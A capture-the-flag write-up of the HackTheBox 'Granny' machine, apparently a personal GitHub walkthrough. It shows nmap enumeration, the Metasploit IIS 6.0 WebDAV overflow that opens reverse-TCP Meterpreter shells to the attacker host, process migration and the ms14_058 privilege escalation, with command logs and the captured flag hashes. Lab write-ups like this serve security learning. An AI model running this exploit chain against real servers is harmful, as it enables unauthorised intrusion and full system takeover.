# References
1. [Granny Writeup (x.com)]()

# Summary
### 1. NMAP

### 2. Enumeration

### 3. Exploit

### 4. Privilege Escalation

# Attack
## 1. NMAP
Hi!
```
hippoeug@kali:~$ nmap -sC -sV 10.10.10.15 -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-26 21:37 +08
...
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Tue, 26 Jan 2021 13:38:16 GMT                                                                                                                        
|_  Server Type: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
...
```
Now, this seriously looks like a carbon copy of [Grandpa](https://github.com/HippoEug/HackTheBox/blob/main/Machines%20(Easy)/Grandpa.md) machine.

What about the vulnerability script?
```
hippoeug@kali:~$ nmap --script vuln 10.10.10.15 -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-26 21:38 +08
...
PORT   STATE SERVICE
80/tcp open  http
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /_vti_bin/: Frontpage file or folder
|   /_vti_log/: Frontpage file or folder
|   /postinfo.html: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.dll: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.exe: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.dll: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.exe: Frontpage file or folder
|   /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder                                                                                          
|   /_vti_bin/shtml.dll: Frontpage file or folder
|   /_vti_bin/shtml.exe: Frontpage file or folder
|   /images/: Potentially interesting folder
|_  /_private/: Potentially interesting folder
| http-frontpage-login: 
|   VULNERABLE:
|   Frontpage extension anonymous login
|     State: VULNERABLE
|       Default installations of older versions of frontpage extensions allow anonymous logins which can lead to server compromise.
|       
|     References:
|_      http://insecure.org/sploits/Microsoft.frontpage.insecurities.html
|_http-iis-webdav-vuln: WebDAV is ENABLED. No protected folder found; check not run. If you know a protected folder, add --script-args=webdavfolder=<path>
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
...
```
This is similar too, except the addition of `/images/: Potentially interesting folder` & `/_private/: Potentially interesting folder`.

## 2. Enumeration
Visiting http://10.10.10.15:80 on our browser, we get an "Under Construction" page.

Let's do some searches for `Microsoft IIS httpd 6.0`. If we end up not being able to find any exploits, we can try Dirbuster.
```
hippoeug@kali:~$ searchsploit iis 6.0
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                                                    | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                                             | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                                               | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                                        | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                                              | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                            | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                                         | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                                         | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                                     | windows/remote/8754.patch
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (PHP)                                                                       | windows/remote/8765.php
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                                            | windows/remote/19033.txt
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Again, quite a few potential exploits. We also Google "microsoft iis httpd 6.0 exploit" to limit down our search. We see two metasploit modules, [Microsoft IIS WebDAV Write Access Code Execution](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_upload_asp/) & [Microsoft IIS WebDav ScStoragePathFromUrl Overflow](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl/).

## 3. Exploit
Let's try the exploit, [Microsoft IIS WebDav ScStoragePathFromUrl Overflow](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl/).
```
msf5 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
[*] Using configured payload windows/meterpreter/reverse_tcp
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options
...
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit

[*] Started reverse TCP handler on 10.10.x.x:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (176195 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.x.x:4444 -> 10.10.10.15:1030) at 2021-01-26 21:47:49 +0800

meterpreter > 
```
We got a Meterpreter shell! Time to find flags.

Let's try to navigate around in Users.
```
meterpreter > cd Lakis
[-] stdapi_fs_chdir: Operation failed: Access is denied.
meterpreter > cd Administrator
[-] stdapi_fs_chdir: Operation failed: Access is denied.
```
Hmm, Access is denied. Let's try getuid.
```
meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
```
Time for privilege escalation.

## 4. Privilege Escalation
Since we got a Meterpreter shell, we can just run the /recon/local_exploit_suggester.
```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 34 exploit checks are being tried...
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```
Let's run the first one, [`exploit/windows/local/ms14_058_track_popup_menu`](https://www.rapid7.com/db/modules/exploit/windows/local/ms14_058_track_popup_menu/). But we must also remember to migrate to a process running under NT AUTHORITY\NETWORK SERVICE.
```
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 272   4     smss.exe                                                        
 324   272   csrss.exe                                                       
 348   272   winlogon.exe                                                    
 396   348   services.exe                                                    
 400   1080  cidaemon.exe                                                    
 408   348   lsass.exe                                                       
 592   396   svchost.exe                                                     
 684   396   svchost.exe                                                     
 740   396   svchost.exe                                                     
 768   396   svchost.exe                                                     
 804   396   svchost.exe                                                     
 940   396   spoolsv.exe                                                     
 968   396   msdtc.exe                                                       
 1080  396   cisvc.exe                                                       
 1136  396   svchost.exe                                                     
 1184  396   inetinfo.exe                                                    
 1216  1080  cidaemon.exe                                                    
 1220  396   svchost.exe                                                     
 1320  1080  cidaemon.exe                                                    
 1332  396   VGAuthService.exe                                               
 1412  396   vmtoolsd.exe                                                    
 1464  396   svchost.exe                                                     
 1604  396   svchost.exe                                                     
 1816  396   alg.exe                                                         
 1832  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1896  396   dllhost.exe                                                     
 2308  592   wmiprvse.exe                                                    
 2680  348   logon.scr                                                       
 3200  1464  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3268  3200  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 3272  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 3408  1464  w3wp.exe                                                        
 4068  592   davcdata.exe                                                    

meterpreter > migrate  1832
[*] Migrating from 3268 to 1832...
[*] Migration completed successfully.
```
Done. Let's get back to our privilege escalation exploit.
```
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > back
msf5 > use exploit/windows/local/ms14_058_track_popup_menu
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/local/ms14_058_track_popup_menu) > show options
...
msf5 exploit(windows/local/ms14_058_track_popup_menu) > exploit

[*] Started reverse TCP handler on 10.10.x.x:4545 
[*] Launching notepad to host the exploit...
[+] Process 3704 launched.
[*] Reflectively injecting the exploit DLL into 3704...
[*] Injecting exploit into 3704...
[*] Exploit injected. Injecting payload into 3704...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176195 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.x.x:4545 -> 10.10.10.15:1031) at 2021-01-26 22:00:30 +0800

meterpreter > 
```
Done! Time to just find flags!
```
meterpreter > dir
Listing: C:\Documents and Settings\Lakis\Desktop
================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-04-13 03:19:57 +0800  user.txt

meterpreter > cat user.txt
700c5dc163014e22b3e408f8703f67d1
...
meterpreter > cd Administrator/Desktop
meterpreter > cat root.txt
aa4beed1c0584445ab463a6747bd06e9
```
